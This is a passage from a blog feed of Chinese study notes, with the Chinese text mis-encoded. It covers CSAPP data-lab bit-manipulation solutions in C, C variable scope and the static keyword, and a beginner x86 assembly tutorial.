!((x&amp;y)^y);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h1><ul><li>å¾—åˆ°xçš„è´Ÿæ•°å½¢å¼</li><li>ç›´æ¥å–ååŠ ä»¥å³å¯</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">negate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<span class="hljs-comment">//for all x,-x=~x+1</span><br>  <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h1><ul><li>åˆ¤æ–­æ˜¯ä¸æ˜¯0-9çš„æ•°å­—</li><li>xåº”è¯¥æ»¡è¶³ï¼š<ul><li>å¤§äºç­‰äº0b00110000</li><li>å°äº    0b00111010</li></ul></li><li>é¦–å…ˆåˆ¤æ–­å‰å››ä½æ˜¯ä¸æ˜¯0011ï¼Œå¦‚æœä¸3å¼‚æˆ–æ˜¯0é‚£ä¹ˆè¯´æ˜æ»¡è¶³</li><li>ç„¶åé€šè¿‡ä¸0xfè¿›è¡Œä¸è¿ç®—çš„æ–¹å¼ï¼Œå°†xå»æ‰last 4 bitsï¼Œç„¶åå‡å»1010ï¼Œé€šè¿‡å³ç§»31ä½å¾—åˆ°ç¬¦å·ä½ä»è€Œåˆ¤æ–­æ­£è´Ÿã€‚å¦‚æœæ˜¯è´Ÿæ•°é‚£ä¹ˆè¯´æ˜å°äº0b00111010ï¼Œå³ç§»31ä½ä¹‹åå¾—åˆ°çš„ç¬¦å·ä½æ˜¯1ï¼›å¦‚æœæ˜¯ç­‰äºæˆ–è€…å¤§äºç¬¦å·ä½æ˜¯0<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span><br><span class="hljs-comment"> *   Example: isAsciiDigit(0x35) = 1.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//0x30:0011 0000  </span><br><span class="hljs-comment">//0x3a:0011 1010 </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> a=!((x&gt;&gt;<span class="hljs-number">4</span>)^<span class="hljs-number">3</span>);<span class="hljs-comment">//must be 0011</span><br>  <span class="hljs-keyword">int</span> b=(x&amp;<span class="hljs-number">0xf</span>)+(~<span class="hljs-number">0xa</span>+<span class="hljs-number">1</span>);<span class="hljs-comment">//get the first 4 bits and minus 0b1010</span><br>  <span class="hljs-keyword">int</span> c=b&gt;&gt;<span class="hljs-number">31</span>;<span class="hljs-comment">//get the last 1 bit is 0 or 1</span><br>  <span class="hljs-keyword">return</span> a&amp;(!!c);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h1></li><li>å®ç°å¼‚æˆ–æ“ä½œï¼ˆx?y:zï¼‰</li><li>å¦‚æœxæ˜¯1ï¼Œé‚£ä¹ˆè¿”å›yçš„å€¼ï¼Œå¦‚æœxæ˜¯0ï¼Œè¿”å›zçš„å€¼</li><li>è¿”å›(x&amp;y)|(~x&amp;z)å³å¯ï¼ˆx=ï¼ï¼xæ˜¯ä¸ºäº†å¾—åˆ°xæ˜¯0è¿˜æ˜¯1ï¼‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * conditional - same as x ? y : z </span><br><span class="hljs-comment"> *   Example: conditional(2,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">conditional</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y, <span class="hljs-keyword">int</span> z)</span> </span>&#123;<br>  x=!!x;<span class="hljs-comment">//convert x to 0/1</span><br>  x=~x+<span class="hljs-number">1</span>;<span class="hljs-comment">//convert x to complement  0 to 0(0000000...00) ; 1 to -1(1111111....11111)</span><br>  <span class="hljs-keyword">return</span> (x&amp;y)|(~x&amp;z);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h1><ul><li>æµ‹è¯•æ˜¯å¦æ»¡è¶³x&lt;=y</li><li>æœ‰ä»¥ä¸‹æƒ…å†µï¼š<ul><li>xç­‰äºyï¼Œæ­¤æ—¶å¼‚æˆ–å¾—åˆ°0</li><li><code>x&lt;y</code><ul><li>å¦‚æœxç¬¦å·ä½ä¸º0yä¸º1é‚£ä¹ˆä¸æ»¡è¶³x&lt;=y</li><li>å¦‚æœxç¬¦å·ä½ä¸º1yä¸º0é‚£ä¹ˆæ»¡è¶³x&lt;=y</li><li>å¦‚æœxç¬¦å·ä½å’Œyçš„ç¬¦å·ä½ç›¸åŒï¼Œé‚£ä¹ˆï¼š<ul><li>å°†xå‡å»yï¼Œåˆ¤æ–­ç»“æœçš„æ­£è´Ÿã€‚åœ¨è¿™é‡Œä¸ºäº†é˜²æ­¢è´Ÿæ•°å‡å»è´Ÿæ•°è€Œæº¢å‡ºï¼Œä½¿ç”¨x+ï¼ˆ-yï¼‰çš„å½¢å¼</li></ul></li></ul></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// 1:x==y 2:x is neg y is pos 3:x is pos and y is pos </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> equal=!(x^y);<br>  <span class="hljs-keyword">int</span> x_flag=!!(x&gt;&gt;<span class="hljs-number">31</span>);<br>  <span class="hljs-keyword">int</span> y_flag=!!(y&gt;&gt;<span class="hljs-number">31</span>);<br>  <span class="hljs-keyword">int</span> minus=x+~y+<span class="hljs-number">1</span>;<span class="hljs-comment">//x-y</span><br>  <span class="hljs-keyword">int</span> minus_flag=!!(minus&gt;&gt;<span class="hljs-number">31</span>);<br>  <span class="hljs-keyword">int</span> not_same=!(x_flag^y_flag);<br>  <span class="hljs-keyword">return</span> equal | (x_flag&amp;!y_flag) | (not_same&amp;minus_flag);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h1><ul><li>åªæœ‰å½“xæ˜¯0çš„æ—¶å€™è¿”å›1ï¼Œxä¸ºè´Ÿæ•°æˆ–æ­£æ•°éƒ½è¿”å›0</li><li>æ€è·¯ï¼š<ul><li>å½“xæ˜¯0æˆ–è€…æœ€å°çš„è´Ÿæ•°çš„æƒ…å†µä¸‹ï¼Œ(x^(~x+1))&gt;&gt;31æ‰ä¸º0b00â€¦000ï¼Œå…¶ä½™æƒ…å†µä¸‹çš†ä¸º0b111111â€¦1111ï¼Œä½¿ç”¨è¿™ä¸ªæ€§è´¨å°†èŒƒå›´ç¼©å°åˆ°0æˆ–è€…æœ€å°çš„è´Ÿæ•°</li><li>åœ¨æ»¡è¶³ä¸Šé¢çš„å‰æä¸‹ï¼Œæ’é™¤æ‰æœ€å°è´Ÿæ•°çš„æƒ…å†µï¼Œå³å¯å¾—åˆ°ç­”æ¡ˆ</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalNeg - implement the ! operator, using all of </span><br><span class="hljs-comment"> *              the legal operators except !</span><br><span class="hljs-comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">logicalNeg</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> y=x^(~x+<span class="hljs-number">1</span>);<span class="hljs-comment">//only if x=000...0000 or x=1000...0000 y=0</span><br>  y=(y&gt;&gt;<span class="hljs-number">31</span>)+<span class="hljs-number">1</span>;<span class="hljs-comment">//get the sign</span><br>  <span class="hljs-keyword">return</span> y&amp;((x&gt;&gt;<span class="hljs-number">31</span>)+<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="howManybits"><a href="#howManybits" class="headerlink" title="howManybits"></a>howManybits</h1><ul><li>é¢˜æ„ï¼šä½¿ç”¨æœ€å°‘å‡ ä½è¡¥ç å¯ä»¥è¡¨ç¤ºä¸€ä¸ªæ•°å­—ï¼Ÿæ¯”å¦‚ä¼ å…¥ä¸€ä¸ªintç±»å‹çš„xï¼Œå€¼ä¸º-5ï¼Œé‚£ä¹ˆå®ƒçš„è¡¥ç åº”è¯¥æ˜¯11111111111111111111111111111011ï¼Œå› æ­¤æœ€å°‘ä½¿ç”¨å››ä¸ªbitså¯ä»¥è¡¨ç¤ºä¹Ÿå³æ˜¯1011ï¼Œ1è¡¨ç¤ºç¬¦å·ä½ã€‚</li><li>æ€è·¯ï¼š<ul><li>å¯ä»¥å°†è´Ÿæ•°çš„æƒ…å†µè½¬åŒ–ä¸ºæ•´æ•°çš„æƒ…å†µã€‚å°†è´Ÿæ•°å–åï¼Œæœ€ç»ˆç»“æœä¸å˜</li><li>æ‰¾åˆ°ç¬¬ä¸€ä¸ª1å‡ºç°çš„ä½ç½®ï¼Œç„¶å+1å³å¯ã€‚æ¯”å¦‚howManyBits(12)=howManyBits(01100),1ç¬¬ä¸€æ¬¡å‡ºç°åœ¨ä»å³å¾€å·¦ç¬¬å››ä½ï¼ŒåŠ ä¸€å³ä½¿5ï¼Œä¹Ÿå°±æ˜¯æœ€å°‘çš„å¯ä»¥è¡¨ç¤ºçš„è¡¥ç çš„ä½æ•°<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="hljs-comment"> *             two&#x27;s complement</span><br><span class="hljs-comment"> *  Examples: howManyBits(12) = 5           01100</span><br><span class="hljs-comment"> *            howManyBits(298) = 10         </span><br><span class="hljs-comment"> *            howManyBits(-5) = 4 </span><br><span class="hljs-comment"> *            howManyBits(0)  = 1</span><br><span class="hljs-comment"> *            howManyBits(-1) = 1</span><br><span class="hljs-comment"> *            howManyBits(0x80000000) = 32</span><br><span class="hljs-comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *  Max ops: 90</span><br><span class="hljs-comment"> *  Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">howManyBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> b16,b8,b4,b2,b1,b0;<br>  <span class="hljs-keyword">int</span> musk=x&gt;&gt;<span class="hljs-number">31</span>;<span class="hljs-comment">//musk is all 1 or all 0</span><br>  x=(~musk&amp;x)|(musk&amp;~x);<span class="hljs-comment">//if x is negative ï¼Œturn x into ~x</span><br> <br>  b16=!!(x&gt;&gt;<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">4</span>;<span class="hljs-comment">//get the last 16 bits&#x27; sign ,and &lt;&lt; 4 turn x into 16 or 0,so if x is 16 means in the last 16 bits there is at least 1</span><br>  x=x&gt;&gt;b16;<span class="hljs-comment">//x&gt;&gt;16 or x&gt;&gt;0</span><br>  b8=!!(x&gt;&gt;<span class="hljs-number">8</span>)&lt;&lt;<span class="hljs-number">3</span>;<br>  x=x&gt;&gt;b8;<br>  b4=!!(x&gt;&gt;<span class="hljs-number">4</span>)&lt;&lt;<span class="hljs-number">2</span>;<br>  x=x&gt;&gt;b4;<br>  b2=!!(x&gt;&gt;<span class="hljs-number">2</span>)&lt;&lt;<span class="hljs-number">1</span>;<br>  x=x&gt;&gt;b2;<br>  b1=!!(x&gt;&gt;<span class="hljs-number">1</span>);<br>  x=x&gt;&gt;b1;<br>  b0=!!x;<br>  <span class="hljs-keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><p>æµ®ç‚¹æ•°éƒ¨åˆ†</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ï¼šä½œç”¨åŸŸè§„åˆ™</title>
    <link href="/p/b163e116/"/>
    <url>/p/b163e116/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/cpro.png"></p><h1 id="å…¨å±€å˜é‡"><a href="#å…¨å±€å˜é‡" class="headerlink" title="å…¨å±€å˜é‡"></a>å…¨å±€å˜é‡</h1><ul><li>åœ¨æ•´ä¸ªç¨‹åºç”Ÿå‘½å‘¨æœŸå†…éƒ½æ˜¯æœ‰æ•ˆçš„</li><li>åœ¨ä»»æ„çš„å‡½æ•°å†…éƒ¨èƒ½è®¿é—®å…¨å±€å˜é‡</li><li>ç³»ç»Ÿä¼šè‡ªåŠ¨å¯¹å…¨å±€å˜é‡åˆå§‹åŒ–</li><li>ä¿å­˜åœ¨å†…å­˜çš„å…¨å±€å­˜å‚¨åŒºä¸­ï¼Œå ç”¨é™æ€çš„å­˜å‚¨å•å…ƒ</li></ul><table><thead><tr><th>æ•°æ®ç±»å‹</th><th>åˆå§‹åŒ–é»˜è®¤å€¼</th></tr></thead><tbody><tr><td>int</td><td>0</td></tr><tr><td>char</td><td>â€˜\0â€™</td></tr><tr><td>float</td><td>0</td></tr><tr><td>double</td><td>0</td></tr><tr><td>pointer</td><td>NULL</td></tr></tbody></table><h1 id="å±€éƒ¨å˜é‡"><a href="#å±€éƒ¨å˜é‡" class="headerlink" title="å±€éƒ¨å˜é‡"></a>å±€éƒ¨å˜é‡</h1><ul><li>åœ¨æŸä¸ªå‡½æ•°æˆ–å—çš„å†…éƒ¨å£°æ˜çš„å˜é‡</li><li>åªèƒ½è¢«è¯¥å‡½æ•°æˆ–è¯¥ä»£ç å—å†…éƒ¨çš„è¯­å¥ä½¿ç”¨</li><li>ä¿å­˜åœ¨æ ˆä¸­</li></ul><h1 id="ä½œç”¨åŸŸ"><a href="#ä½œç”¨åŸŸ" class="headerlink" title="ä½œç”¨åŸŸ"></a>ä½œç”¨åŸŸ</h1><ul><li>åå­—çš„ä½œç”¨åŸŸæŒ‡çš„æ˜¯ç¨‹åºä¸­å¯ä»¥ä½¿ç”¨è¯¥åå­—çš„éƒ¨åˆ†</li><li>å˜é‡æˆ–å‡½æ•°çš„ä½œç”¨åŸŸä»å£°æ˜å®ƒçš„åœ°æ–¹å¼€å§‹ï¼Œåˆ°å…¶æ‰€åœ¨çš„ï¼ˆå¾…ç¼–è¯‘çš„ï¼‰æ–‡ä»¶çš„æœ«å°¾ç»“æŸ</li><li>ä¸€ä¸ªç¨‹åºå…·æœ‰å¤šä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªå˜é‡åªèƒ½åœ¨æŸä¸ªæ–‡ä»¶ä¸­å®šä¹‰ä¸€æ¬¡ï¼Œè€Œå…¶ä»–æ–‡ä»¶å¯ä»¥é€šè¿‡externå£°æ˜æ¥è®¿é—®å®ƒ</li></ul><p>file1ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> sp;<br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">double</span> val[];<span class="hljs-comment">//æ³¨æ„è¿™é‡Œ</span><br></code></pre></td></tr></table></figure><p>file2:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> sp = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">double</span> val[MAXVAL];<br></code></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ï¼Œspå’Œvalå¯ä»¥åœ¨file1ä¸­ä½¿ç”¨</p><h1 id="staticå…³é”®å­—"><a href="#staticå…³é”®å­—" class="headerlink" title="staticå…³é”®å­—"></a>staticå…³é”®å­—</h1><ul><li>ç”¨ staticå£°æ˜é™å®šå¤–éƒ¨å˜é‡ä¸å‡½æ•°ï¼Œå¯ä»¥å°†å…¶åå£°æ˜çš„å¯¹è±¡çš„ä½œç”¨åŸŸé™å®šä¸ºè¢«ç¼–è¯‘æºæ–‡ä»¶çš„å‰©ä½™éƒ¨åˆ†</li><li>static ç±»å‹çš„å†…éƒ¨å˜é‡æ˜¯ä¸€ç§åªèƒ½åœ¨æŸä¸ªç‰¹å®šå‡½æ•°ä¸­ä½¿ç”¨ä½†ä¸€ç›´å æ®å­˜å‚¨ç©ºé—´çš„å˜é‡</li></ul><p>åœ¨ä¸è¿›è¡Œæ˜¾å¼åˆå§‹åŒ–çš„æƒ…å†µä¸‹ï¼Œå¤–éƒ¨å˜é‡å’Œé™æ€å˜é‡éƒ½å°†è¢«åˆå§‹åŒ–ä¸º 0ï¼Œè€Œè‡ªåŠ¨å˜é‡å’Œå¯„å­˜å™¨å˜é‡çš„åˆå€¼åˆ™æ²¡æœ‰å®šä¹‰ï¼ˆå³åˆå€¼ä¸ºæ— ç”¨çš„ä¿¡æ¯ï¼‰</p>]]></content>
    
    
    <categories>
      
      <category>Cè¯­è¨€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cè¯­è¨€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ±‡ç¼–è¯­è¨€ï¼šç®€å•ç¤ºä¾‹ç¨‹åºè®²è§£</title>
    <link href="/p/2fa8408d/"/>
    <url>/p/2fa8408d/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/assembly1.jpeg"></p><h1 id="æœ€ç®€å•çš„æ±‡ç¼–ç¨‹åº"><a href="#æœ€ç®€å•çš„æ±‡ç¼–ç¨‹åº" class="headerlink" title="æœ€ç®€å•çš„æ±‡ç¼–ç¨‹åº"></a>æœ€ç®€å•çš„æ±‡ç¼–ç¨‹åº</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl">.section .data<br>.section .text<br>.globl _start<br>_start:<br>movl $1, %eax <span class="hljs-comment"># this is the linux kernel command</span><br><span class="hljs-comment"># number (system call) for exiting</span><br><span class="hljs-comment"># a program</span><br>movl $4, %ebx <span class="hljs-comment"># this is the status number we will</span><br><span class="hljs-comment"># return to the operating system.</span><br><span class="hljs-comment"># Change this around and it will</span><br><span class="hljs-comment"># return different things to</span><br><span class="hljs-comment"># echo $?</span><br><span class="hljs-keyword">int</span> $0x8<span class="hljs-number">0</span> <span class="hljs-comment"># this wakes up the kernel to run</span><br><span class="hljs-comment"># the exit command</span><br></code></pre></td></tr></table></figure><ul><li>ç¼–å†™å®Œæˆåï¼Œé€šè¿‡asæŒ‡ä»¤æ±‡ç¼–ä¸º.oæ–‡ä»¶ï¼Œç„¶åé€šè¿‡ldæŒ‡ä»¤é“¾æ¥ä¸ºå¯æ‰§è¡Œæ–‡ä»¶</li><li>è¯¥æ±‡ç¼–ç¨‹åºçš„æœ¬è´¨ï¼š<ul><li>å°†é€€å‡ºçŠ¶æ€è®¾ç½®ä¸º4</li><li>shellä¸­ä½¿ç”¨$?å¾—åˆ°é€€å‡ºçš„çŠ¶æ€ç å¯ä»¥æ£€æµ‹é€€å‡ºçŠ¶æ€</li></ul></li><li>#è¡¨ç¤ºæ³¨é‡Š</li><li><code>.</code>å¼€å¤´çš„è¡¨ç¤ºä¼ªæŒ‡ä»¤<ul><li><code>.data</code>æ®µä¿å­˜ç¨‹åºçš„æ•°æ®ï¼Œæ˜¯å¯è¯»å¯å†™çš„ï¼ŒCç¨‹åºçš„å…¨å±€å˜é‡ä¹Ÿå±äº.dataæ®µã€‚æœ¬ç¨‹åºä¸­æ²¡æœ‰å®šä¹‰æ•°æ®ï¼Œæ‰€ä»¥.dataæ®µæ˜¯ç©ºçš„ã€‚</li><li><code>.text</code>æ®µä¿å­˜ä»£ç ï¼Œæ˜¯<strong>åªè¯»å’Œå¯æ‰§è¡Œ</strong>çš„</li></ul></li><li>ç¬¦å·ï¼ˆSymbolï¼‰<ul><li><strong>ç¬¦å·åœ¨æ±‡ç¼–ç¨‹åºä¸­ä»£è¡¨ä¸€ä¸ªåœ°å€</strong>ã€‚æ±‡ç¼–ç¨‹åºç»è¿‡æ±‡ç¼–å™¨çš„å¤„ç†ä¹‹åï¼Œæ‰€æœ‰çš„ç¬¦å·éƒ½è¢«æ›¿æ¢æˆå®ƒæ‰€ä»£è¡¨çš„åœ°å€å€¼</li><li>å˜é‡åå’Œå‡½æ•°åéƒ½æ˜¯ç¬¦å·ï¼Œæœ¬è´¨ä¸Šæ˜¯ä»£è¡¨å†…å­˜åœ°å€çš„<ul><li>é€šè¿‡å˜é‡åè®¿é—®ä¸€ä¸ªå˜é‡ï¼Œæœ¬è´¨æ˜¯è¯»å†™æŸä¸ªåœ°å€çš„å†…å­˜å•å…ƒ</li><li>é€šè¿‡å‡½æ•°åè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå…¶å®å°±æ˜¯è·³è½¬åˆ°è¯¥å‡½æ•°ç¬¬ä¸€æ¡æŒ‡ä»¤æ‰€åœ¨çš„åœ°å€</li></ul></li></ul></li><li>_start<ul><li>æ˜¯ä¸€ä¸ªåœ°å€ï¼Œæ•´ä¸ªç¨‹åºçš„å…¥å£</li><li>.globlæŒ‡ç¤ºå‘Šè¯‰æ±‡ç¼–å™¨ï¼Œ_startè¿™ä¸ªç¬¦å·è¦è¢«é“¾æ¥å™¨ç”¨åˆ°</li></ul></li><li>intæŒ‡ä»¤ç§°ä¸ºè½¯ä¸­æ–­æŒ‡ä»¤ï¼Œå¯ä»¥ç”¨è¿™æ¡æŒ‡ä»¤æ•…æ„äº§ç”Ÿä¸€ä¸ªå¼‚å¸¸ï¼Œä»è€Œä»ç”¨æˆ·æ€ä¸‹é™·åˆ°å†…æ ¸æ€<ul><li>intæŒ‡ä»¤ä¸­çš„ç«‹å³æ•°0x80æ˜¯ä¸€ä¸ªå‚æ•°ï¼Œè§¦å‘ç³»ç»Ÿè°ƒç”¨</li><li>eaxå’Œebxå¯„å­˜å™¨çš„å€¼æ˜¯ä¼ é€’ç»™ç³»ç»Ÿè°ƒç”¨çš„ä¸¤ä¸ªå‚æ•°<ul><li>eaxçš„å€¼æ˜¯ç³»ç»Ÿè°ƒç”¨å·ï¼Œ1å¯¹åº”_exitç³»ç»Ÿè°ƒç”¨</li><li>ebxçš„å€¼æ˜¯ä¼ ç»™_exitç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯é€€å‡ºçŠ¶æ€</li></ul></li></ul></li></ul><h1 id="æ±‚ä¸€ç»„æ•°çš„æœ€å¤§å€¼"><a href="#æ±‚ä¸€ç»„æ•°çš„æœ€å¤§å€¼" class="headerlink" title="æ±‚ä¸€ç»„æ•°çš„æœ€å¤§å€¼"></a>æ±‚ä¸€ç»„æ•°çš„æœ€å¤§å€¼</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs perl">.section .data<br>data_items:<br>    .long <span class="hljs-number">3</span>,<span class="hljs-number">67</span>,<span class="hljs-number">34</span>,<span class="hljs-number">222</span>,<span class="hljs-number">45</span>,<span class="hljs-number">75</span>,<span class="hljs-number">54</span>,<span class="hljs-number">34</span>,<span class="hljs-number">44</span>,<span class="hljs-number">33</span>,<span class="hljs-number">22</span>,<span class="hljs-number">11</span>,<span class="hljs-number">66</span>,<span class="hljs-number">0</span> <span class="hljs-comment"># </span><br>.section .text<br>.global _start<br><br>_start:<br>    movl $0,%edi<br>    movl data_items(,%edi,<span class="hljs-number">4</span>), %eax<br>    movl %eax,%ebx<br><br>start_loop:<br>    cmpl $0,%eax<br>    je loop_exit<br>    incl %edi<br>    movl data_items(,%edi,<span class="hljs-number">4</span>),%eax <span class="hljs-comment">#å°†å½“å‰æ•°ç»„çš„æ•°å­—æ”¾åˆ°eaxæ€»</span><br>    cmpl %ebx,%eax<span class="hljs-comment">#æ¯”è¾ƒebxå’Œeaxå‚¨å­˜çš„æ•°å­—çš„å¤§å°</span><br>    jle 